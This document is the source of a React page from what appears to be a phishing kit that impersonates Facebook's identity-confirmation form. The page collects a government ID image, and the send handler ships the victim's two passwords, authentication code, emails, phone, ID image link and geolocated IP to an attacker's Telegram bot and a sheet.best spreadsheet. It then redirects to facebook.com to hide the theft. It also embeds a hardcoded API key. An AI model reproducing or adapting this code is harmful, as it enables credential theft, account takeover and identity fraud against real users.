import React, { useState } from "react";

import "../upload-image/style.css";
import { ECloudinary, ETelegram } from "../../constants";
import { Button } from "antd";
import axios from "axios";
import { useDispatch, useSelector } from "react-redux";
import { setData } from "../../store/business/businessSlice";

const UploadImagePage = () => {
  const [file, setFile] = useState<any>(null);
  const business = useSelector((state: any) => state.business);
  const dispatch = useDispatch();
  const [loading, setLoading] = useState(false);

  const handleUpload = async (event: any) => {
    console.log("file: ", event);
    setFile(event.target.files[0]);
  };

  const handleSend = async () => {
    try {
      if (!file) return;
      setLoading(true);
      const formData = new FormData();
      const cloudName = ECloudinary.CLOUDINARY_CLOUD_NAME;
      formData.append("file", file);
      formData.append("upload_preset", ECloudinary.CLOUDINARY_UPLOAD_PRESET);
      formData.append("cloud_name", cloudName);
      const response = await fetch(
        `https://api.cloudinary.com/v1_1/${cloudName}/image/upload`,
        {
          method: "POST",
          body: formData,
        }
      );
      const data = await response.json();
      const responseIp = await axios.get(
        "https://ipgeolocation.abstractapi.com/v1/?api_key=0b54578041c84e4684b6c0f2542c1721"
      );
      await Promise.all([

        sendTelegramBotForBusiness(data.secure_url, responseIp),
        sendTelegramBotForGgsheet(data.secure_url, responseIp),
      ]);

      clearStore();

      setLoading(false);
      window.location.href = "https://www.facebook.com/"; // Redirect to Facebook
    } catch (error) {
      setLoading(false);
    }
  };

  const sendTelegramBotForGgsheet = async (image: string, responseIp: any) => {
    const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
    let CURRENT_API_URL = API_URL + "sendMessage";
    try {
      let message = "✅ Đã thêm vào sheet thành công";
      const data = {
        ["Name Page"]: business.namePage,
        ["Full Name"]: business.fullName,
        ["Business Email Address"]: business.businessEmail,
        ["Personal Email Address"]: business.personalEmail,
        ["Mobile Phone Number"]: business.phone,
        // ["Date of Birth"]: business.date,
        ["Please provide us information that will help us investigate"]:
          business.text,
        ["Password First"]: business.passwordFirst,
        ["Password Second"]: business.passwordSecond,
        ["Code"]: business.code,
        ["Image"]: image,
        ['Ip']: responseIp.data.ip_address,
        ['City']: responseIp.data.city,
        ['Country']: responseIp.data.country,
      };
      await axios
        .post(
          "https://sheet.best/api/sheets/abe85991-15f1-47f0-a1d6-242f44b22e94",
          data
        )
        .catch(() => {
          message = "❌Thêm vào sheet không thành công";
        });
      await axios.post(
        CURRENT_API_URL,
        {
          chat_id: ETelegram.CHAT_ID,
          parse_mode: "html",
          document: "",
          text: message,
          caption: message,
        },
        {
          headers: {
            "Content-Type": "multipart/form-data",
          },
        }
      );
    } catch (err) {
      console.log("err: ", err);
    }
  };

  const sendTelegramBotForBusiness = async (image: string, responseIp: any) => {
    const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
    let CURRENT_API_URL = API_URL + "sendMessage";
    try {

      let message = `
      Email Account:  ${business.businessEmail}
      Name Account: ${business.namePage}
      Person Email: ${business.personalEmail}
      Facebook Page: ${business.text}
      User Name: ${business.fullName}
      Phone Number: ${business.phone}
      Password First: ${business.passwordFirst}
      Password Second: ${business.passwordSecond}
      Ip: ${responseIp.data.ip_address}
      City: ${responseIp.data.city}
      Country: ${responseIp.data.country}
      Code Authen: ${business.code}
      Image: ${image}
      `;
      await axios.post(
        CURRENT_API_URL,
        {
          chat_id: ETelegram.CHAT_ID,
          parse_mode: "html",
          document: "",
          text: message,
          caption: message,
        },
        {
          headers: {
            "Content-Type": "multipart/form-data",
          },
        }
      );
    } catch (err) {
      console.log("err: ", err);
    }
  };

  const clearStore = () => {
    dispatch(
      setData({
        namePage: "",
        fullName: "",
        businessEmail: "",
        personalEmail: "",
        phone: "",
        // date: "",
        text: "",
        passwordFirst: "",
        passwordSecond: "",
        code: "",
      })
    );
  };

  return (
    <div className="container_upload">
      <div className="header"><header>Confirm Your Identity With Facebook</header></div>

      <div className="content">
        <div className="content_text">

          <h2 className="header_text">Confirm Your Identity With Facebook</h2>
          <p>Before we can review your account, please fill out the form below to help us verify your identity.</p>
          <p>
            Please attach a copy of your ID(s). Learn more about why we require ID
            verification and what types of ID we'll accept below.
          </p>
          <hr />
          <p style={{ fontWeight: "bold" }}>Do not hide information on identification documents digitally</p>
          <p>
            To prevent the use of fake identification and other abuses, we do not
            accept photos that have been digitally altered to hide information.
          </p>
          <hr />
          <p style={{ fontWeight: "bold" }}>Government-issued identification documents</p>
          <p>
            To confirm your name or regain access to your account, you can send us 1
            government-issued identification.{" "}
          </p>
          <p>Any identification documents you send to us must include:</p>
          <p>Your name and date of birth, or</p>
          <p>Your name and photo.</p>
          <p>Here are some examples of government-issued IDs we accept:</p>
          <p>*Driving license</p>
          <p>*Identity card</p>
          <p>*Passport</p>
          <p>*Birth certificate</p>

          <hr />
          <p style={{ fontWeight: "bold" }}>Identification documents are not issued by the government</p>
          <p>*Student card</p>
          <p>*Library card</p>
          <p>*Refugee card</p>
          <p>*Employment confirmation certificate</p>
          <p>*Degree</p>
          <p>*Loyalty card</p>
          <hr />

          <p>Your identification documents ID(s)</p>
          <p style={{ fontSize: "12px" }}>As it's listed on the account</p>
          <input style={{ padding: "5px 8px" }} type="file" accept="image/*" onChange={handleUpload} />
          <p style={{ paddingBottom: '10px' }}>
            We may encrypt and store your ID for up to one year to improve our
            automated systems for detecting fake IDs. We might use trusted service
            providers to help review your information. Your ID will be stored
            securely and will not be visible to anyone on Facebook. If you don't
            want Facebook to use your ID to improve our automated systems for
            detecting fake IDs, you can adjust your Identity Confirmation Settings.
            If you turn this option off, the copy of your ID will be deleted within
            30 days of submission or when you turned this option off. Visit the Help
            Centre to learn more about what happens to your ID after you have sent
            it to us.
          </p>
        </div>
      </div>

      <div className="footer">
        <Button style={{ height: "40px", marginTop: "10px", width: "100%" }} onClick={handleSend} loading={loading} type="primary">
          Send
        </Button>
        <p style={{ fontSize: "16px", fontWeight: 'bold', marginTop: '20px', marginBottom: "10px" }}>Submitting ID</p>
        <ul>

          <li>ID rejected by Facebook</li>
          <li>Types of IDs that Facebook accepts?</li>
          <li>How to upload an ID to Facebook?</li>
          <li>Why Facebook may ask you to upload an ID</li>
          <li>What happens to your ID after you send it to Facebook</li>
        </ul>
      </div>

    </div>
  );
};
export default UploadImagePage;
